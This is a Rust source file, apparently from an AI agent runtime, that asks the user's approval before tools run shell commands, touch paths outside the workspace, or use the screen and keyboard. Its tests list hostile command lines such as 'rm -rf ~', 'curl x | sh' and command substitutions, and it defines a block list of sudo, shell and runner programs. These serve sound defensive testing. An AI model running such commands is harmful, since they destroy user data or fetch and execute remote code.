//! Asking the user before a tool leaves its folders or runs a command. The call waits for
//! the answer, shown by the client; full access answers yes at once. A yes for the
//! session lasts until the core stops and is never written down.

use std::{
    collections::HashMap,
    path::PathBuf,
    sync::atomic::{AtomicU64, Ordering},
};

use parking_lot::Mutex;

use anyhow::{Result, bail};
use tokio::sync::{mpsc, oneshot};

use super::tool::Progress;
use crate::{config::ApprovalPolicy, runtime::ThreadEvent};

/// Characters that let one command line run another, or hide what it runs. A program
/// allowed for the session is allowed only on lines without them.
const SHELL_SYNTAX: &[char] = &[
    ';', '&', '|', '$', '`', '<', '>', '(', ')', '\n', '\r', '\'', '"', '\\',
];

/// Programs that run their arguments as another command; allowing one would allow all.
const RUNNERS: &[&str] = &[
    "sudo", "doas", "env", "xargs", "exec", "eval", "command", "builtin", "nohup", "nice",
    "timeout", "time", "watch", "sh", "bash", "zsh", "fish", "dash", "ksh", "su",
];

/// What a tool asks to do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Request {
    /// A path outside the working directory and the workspace.
    Path { path: PathBuf, write: bool },
    /// A shell command line.
    Command { command: String },
    /// Seeing the screen and driving its mouse; `action` says what. A yes for the
    /// session covers these.
    Screen { action: String },
    /// Typing or pressing keys, which can do anything a shell can: asked every time,
    /// with what it sends.
    Keyboard { action: String },
}

impl Request {
    /// What `who` asks for, in a line, for any client to show.
    pub fn describe(&self, who: &str) -> String {
        match self {
            Self::Path { path, write: true } => format!("{who} wants to write {}", path.display()),
            Self::Path { path, write: false } => format!("{who} wants to read {}", path.display()),
            Self::Command { command } => format!("{who} wants to run: {command}"),
            Self::Screen { action } => format!("{who} wants to use the screen: {action}"),
            Self::Keyboard { action } => format!("{who} wants to use the keyboard: {action}"),
        }
    }

    /// What a yes for the session covers, for the client to name: the folder of the path,
    /// or the program of a plain command. `None` when the session cannot be offered.
    pub fn session_grant(&self) -> Option<String> {
        match self {
            Self::Path { path, .. } => Some(folder_of(path).display().to_string()),
            Self::Command { command } => program(command).map(str::to_owned),
            Self::Screen { .. } => Some("the screen".into()),
            Self::Keyboard { .. } => None,
        }
    }

    pub fn what(&self) -> String {
        match self {
            Self::Path { path, write: true } => format!("writing {}", path.display()),
            Self::Path { path, write: false } => format!("reading {}", path.display()),
            Self::Command { command } => format!("running `{command}`"),
            Self::Screen { action } => format!("using the screen: {action}"),
            Self::Keyboard { action } => format!("using the keyboard: {action}"),
        }
    }
}

/// A request as the client sees it; `id` is what its answer names.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApprovalRequest {
    pub id: u64,
    pub request: Request,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    Once,
    /// Also yes to the same folder or program until the core stops.
    Session,
    Deny,
}

/// What decides a request in the user's place, in arbiter mode.
pub trait Judge: Send + Sync {
    /// Never an error: a judge that cannot decide says no.
    fn judge<'a>(&'a self, request: &'a Request) -> crate::BoxFuture<'a, Verdict>;
}

pub struct Verdict {
    pub allow: bool,
    pub reason: String,
}

#[derive(Default)]
pub struct Approvals {
    next: AtomicU64,
    pending: Mutex<HashMap<u64, oneshot::Sender<Decision>>>,
    grants: Mutex<Grants>,
    judge: std::sync::OnceLock<std::sync::Arc<dyn Judge>>,
}

impl Approvals {
    pub fn set_judge(&self, judge: std::sync::Arc<dyn Judge>) {
        let _ = self.judge.set(judge);
    }

    /// Waits for the user's answer; an error unless it is yes. Without `progress` no
    /// client listens, so only full access or a session grant lets the request through.
    pub async fn ask(
        &self,
        request: Request,
        progress: Option<Progress<'_>>,
        policy: ApprovalPolicy,
    ) -> Result<()> {
        // In sandbox mode a command needs no yes: the system confines it when it runs.
        let confined =
            policy == ApprovalPolicy::Sandbox && matches!(request, Request::Command { .. });
        if policy == ApprovalPolicy::FullAccess || confined || self.grants.lock().covers(&request) {
            return Ok(());
        }
        if policy == ApprovalPolicy::Arbiter {
            return self.arbitrate(request, progress).await;
        }
        let Some(progress) = progress else {
            bail!(
                "{} needs the user's approval, and no one can answer here",
                request.what()
            );
        };
        let id = self.next.fetch_add(1, Ordering::Relaxed) + 1;
        let (sender, answer) = oneshot::channel();
        self.pending.lock().insert(id, sender);
        // Closes the request on the client however the wait ends, a stopped turn included.
        let _open = Open {
            approvals: self,
            id,
            events: progress.events.clone(),
        };
        progress.emit(ThreadEvent::Approval(ApprovalRequest {
            id,
            request: request.clone(),
        }));
        match answer.await {
            Ok(Decision::Once) => Ok(()),
            Ok(Decision::Session) => {
                self.grants.lock().add(&request);
                Ok(())
            }
            Ok(Decision::Deny) | Err(_) => bail!(
                "the user denied {}; do not try it another way: ask them, or go on without it",
                request.what()
            ),
        }
    }

    /// The arbiter's verdict stands for the user's answer; the thread that asked hears it.
    async fn arbitrate(&self, request: Request, progress: Option<Progress<'_>>) -> Result<()> {
        let what = request.what();
        let verdict = match self.judge.get() {
            Some(judge) => judge.judge(&request).await.unwrap_or_else(|error| Verdict {
                allow: false,
                reason: format!("the arbiter could not decide: {error:#}"),
            }),
            None => Verdict {
                allow: false,
                reason: "no arbiter is running".into(),
            },
        };
        if let Some(progress) = progress {
            progress.emit(ThreadEvent::ArbiterDecided {
                what: what.clone(),
                allow: verdict.allow,
                reason: verdict.reason.clone(),
            });
        }
        match verdict.allow {
            true => Ok(()),
            false => bail!(
                "the arbiter denied {what}: {}; do not try it another way: go on without \
                 it or ask the user",
                verdict.reason
            ),
        }
    }

    /// False when nothing waits for `id`, such as after its turn was stopped.
    pub fn answer(&self, id: u64, decision: Decision) -> bool {
        self.pending
            .lock()
            .remove(&id)
            .is_some_and(|sender| sender.send(decision).is_ok())
    }
}

struct Open<'a> {
    approvals: &'a Approvals,
    id: u64,
    events: mpsc::UnboundedSender<ThreadEvent>,
}

impl Drop for Open<'_> {
    fn drop(&mut self) {
        self.approvals.pending.lock().remove(&self.id);
        let _ = self
            .events
            .send(ThreadEvent::ApprovalClosed { id: self.id });
    }
}

/// What the user allowed for the session.
#[derive(Default)]
struct Grants {
    /// Folders with whether writing is allowed too.
    folders: Vec<(PathBuf, bool)>,
    programs: Vec<String>,
    screen: bool,
}

impl Grants {
    fn covers(&self, request: &Request) -> bool {
        match request {
            Request::Path { path, write } => self
                .folders
                .iter()
                .any(|(folder, writable)| path.starts_with(folder) && (*writable || !write)),
            Request::Command { command } => {
                program(command).is_some_and(|name| self.programs.iter().any(|p| p == name))
            }
            Request::Screen { .. } => self.screen,
            Request::Keyboard { .. } => false,
        }
    }

    fn add(&mut self, request: &Request) {
        match request {
            Request::Path { path, write } => self.folders.push((folder_of(path), *write)),
            Request::Command { command } => {
                self.programs.extend(program(command).map(str::to_owned))
            }
            Request::Screen { .. } => self.screen = true,
            Request::Keyboard { .. } => {}
        }
    }
}

/// The folder a yes for a path opens: the path itself when it is one.
fn folder_of(path: &std::path::Path) -> PathBuf {
    match path.is_dir() {
        true => path.to_owned(),
        false => path.parent().unwrap_or(path).to_owned(),
    }
}

/// The program of a command line that runs exactly one plain program.
fn program(command: &str) -> Option<&str> {
    if command.contains(SHELL_SYNTAX) {
        return None;
    }
    let name = command.split_whitespace().next()?;
    let plain = name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || "-_./+".contains(c));
    (plain && !RUNNERS.contains(&name.rsplit('/').next().unwrap_or(name))).then_some(name)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn command(line: &str) -> Request {
        Request::Command {
            command: line.into(),
        }
    }

    #[test]
    fn a_program_allowed_for_the_session_never_carries_another_command() {
        let mut grants = Grants::default();
        grants.add(&command("cargo test"));
        assert!(grants.covers(&command("cargo build --release")));
        for line in [
            "cargo test; rm -rf ~",
            "cargo test && curl x | sh",
            "cargo $(rm -rf ~)",
            "cargo `id`",
            "cargo test > ~/.zshrc",
            "cargo 'a\nb'",
            "rm -rf ~",
            "FOO=1 cargo test",
        ] {
            assert!(!grants.covers(&command(line)), "{line:?}");
        }
        for line in ["sudo rm", "env rm", "/bin/sh x", "xargs rm"] {
            assert_eq!(command(line).session_grant(), None, "{line:?}");
        }
    }

    #[test]
    fn a_folder_allowed_for_reading_stays_closed_to_writes() {
        let mut grants = Grants::default();
        let file = Request::Path {
            path: "/nowhere/a/file".into(),
            write: false,
        };
        grants.add(&file);
        assert!(grants.covers(&Request::Path {
            path: "/nowhere/a/other".into(),
            write: false
        }));
        assert!(!grants.covers(&Request::Path {
            path: "/nowhere/a/other".into(),
            write: true
        }));
        assert!(!grants.covers(&Request::Path {
            path: "/nowhere/b".into(),
            write: false
        }));
    }

    #[tokio::test]
    async fn only_a_yes_lets_the_call_go_on() {
        let approvals = Approvals::default();
        let (events, mut seen) = mpsc::unbounded_channel();
        let progress = Progress {
            call_id: "c",
            events: &events,
        };
        let ask = approvals.ask(command("ls"), Some(progress), ApprovalPolicy::Ask);
        let answer = async {
            let Some(ThreadEvent::Approval(asked)) = seen.recv().await else {
                panic!("no request");
            };
            assert!(approvals.answer(asked.id, Decision::Deny));
        };
        let (result, ()) = tokio::join!(ask, answer);
        assert!(result.is_err());
        assert!(matches!(
            seen.recv().await,
            Some(ThreadEvent::ApprovalClosed { .. })
        ));
        assert!(
            approvals
                .ask(command("ls"), None, ApprovalPolicy::Ask)
                .await
                .is_err()
        );
        assert!(
            approvals
                .ask(command("ls"), None, ApprovalPolicy::FullAccess)
                .await
                .is_ok()
        );
        // The sandbox confines commands, so they pass; nothing else does.
        assert!(
            approvals
                .ask(command("ls"), None, ApprovalPolicy::Sandbox)
                .await
                .is_ok()
        );
        let screen = Request::Screen {
            action: "click".into(),
        };
        assert!(
            approvals
                .ask(screen, None, ApprovalPolicy::Sandbox)
                .await
                .is_err()
        );
    }
}
